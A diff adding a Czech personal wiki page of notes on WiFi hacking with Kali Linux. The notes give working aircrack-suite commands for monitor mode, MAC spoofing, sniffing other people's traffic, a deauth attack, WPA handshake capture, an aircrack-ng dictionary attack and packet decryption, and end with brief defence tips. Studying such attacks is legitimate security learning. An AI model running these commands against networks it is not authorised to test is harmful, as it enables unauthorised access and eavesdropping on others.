@@ -1,0 +1,80 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2016-02-03T22:22:13+01:00
+
+====== WifiSecurity ======
+Created Středa 03 únor 2016
+
+Dvě podstatné součásti -> Kali Linux + USB Wireless adapter (monitor mode + packet injection) www.wirelesshack.org
+
+=== Důležité příkazy ===
+ifconfig - ukáže a umožňuje nastavovat síťová zařízení = eth0, wlan0, lo, wlan1
+ifconfig wlan1 - vypíše pouze informace o jednom síťovém zařízení
+ifconfig -a - ukáže všechny zařízení, ne jenom ty aktivní
+ifconfig eth0 down - vypne požadované zařízení (opak je up)
+ifconfig eth0 192.157.2.5 - změní IP adresu -> IP spoofing
+ifconfig eth0 netmask 255.255.125.0 - změní masku
+ifconfig eth0 hw ether 1ae3df54sdf3sd1 - změní Mac adresu  -> Mac spoofing
+iwconfig - ukáže veškeré nastavení pro bezdrátové karty
+
+Snifing = sledování traficu cizích lidí, nelze v normálním modu wifi (Managed), chceme přepnout do Monitor Modu, ale pozor karty se zase samy přepínají do managed modu
+
+**airmon-ng** -> vypíše naše wifi karty
+airmon-ng check - vypíše programy, které můžou způsobovat problém s přehozením karty do Managed modu
+airmon-ng check kill - zabije všechny škodlivé programy
+airmon-ng start wlan1 - zapne kartu do Monitor modu, přejmenuje wlan1 -> wlan1mon
+airmon-ng stop wlan1mon - vypne monitorovací mód, poté ještě potřeba restartovat network manager
+service network-manager start
+
+=== Změnení Mac Adresy ===
+ifconfig wlan1 down - vypne zařízení
+**macchanger**  -r wlan1 - dá náhodnou mac adresu
+ifconfig wlan1 up
+
+=== Nahození monitoring modu ===
+airmon-ng check kill
+airmon-ng start wlan1
+
+=== Zachycování traficu ===
+
+wireshark - spustí program na detekci trafiku cizích lidí, umožní detekovat a prohlížet pakety, ale všechno kódováno, dá se rozlousknout
+nebo z příkazové řádky
+**airodump-ng** wlan1mon - sleduje trafic, hořejšek pro všechny možný sítě, spodek jsou zařízení
+	BSSID - mac adresa
+	PWR - síla signálu (blíž k nule je nejsilnější, -70 minimum, -92 už nelze)
+	Beacon - zprávy, které jsou posílány ven
+	#Data - počet packetů, které byly zachyceny
+	Ch - channel, aby spolu neinterferovali, tak vysílají na jiných kanálech
+	MB - rychlost
+	ENC - encryption
+	ESSID - friendly name of your wifi
+airodump-ng --bssid as:fe:fe:ef:df wlan1mod - sledování traficu z jednoho konkrétního zařízení
+
+=== Deauth attack ===
+předstíráme, že jsme router
+airodump-ng  --channel 11(dle zachycených info) --bssid as:sd:ds:ds:dd wlan1mon - jenom pro získání informací, potřebujeme pouze mac adresu routeru a mac adresu zařízení
+**aireplay-ng** --deauth 2000 -a as:as:as:as:as -c qw:qw:qw:qw:qw  wlan1mon - posíláme deauth packaty (2000 jich), něco jako byebye pakety, první mac je mac routeru a druhá zařízení
+
+=== WPA/WAP2 heslo ===
+Při přihlašování nového zařízení do sítě, nelze posílat zadané heslo v prostém textu do routeru, prtž by ho někdo mohl odchytit. Ve skutečnosti zařízení pouze použije to heslo a proženeho hashing algoritmem, který vytvoří jedinečnou sekvenci, která je již možná odeslat a ověřit.
+Tato sekvence je tvořena heslem, SSID, mac adresou a podobně.
+My můžeme tuhle sekvenci zachytit a použít to obráceně k získání hesla. Když teď budeme zkoušet různá hesla dokud nám to nedá stejnou sekvenci, tak zjistíme heslo = DICTIONARY ATTACK
+
+=== Dictionary attack ===
+airodump-ng --bssid sd:ds:ds:ds:sd --channel 11 --write Desktop/myCaptureFile wlan1mon
+poté provést Deauth attack -> WPA handshake
+sehnat soubor s hesly
+**aircrack-ng **Desktop/myCaptureFile.cap -w Desktop/passwordList.txt
+heslo lze použít k přihlášení do sítě, ale taky k rozšifrování packetů
+**airdecap-ng** -e 'NameOfTheWifi' -p heslo myCaptureFile.cap - slouží k decryptování zachycených packetů
+
+=== Jak se bránit Dictionary Attack ===
+Zaprvé minimálně 10 znaků, malá, velká písmena, čísla a znaky.
+Pokud se musíte přihlásit někam, kde nemáte pravomoc upravit heslo a stejně se bojíte, že by vás mohl někdo odposlouchávat -> použijte **VPN.**
+Proxy server - server, který využíváme k obejití firewallu
+VPN = vylepšená proxy. Jedná na tvůj pokyn s jinými stránkami + šifruje
+
+
+
+
+
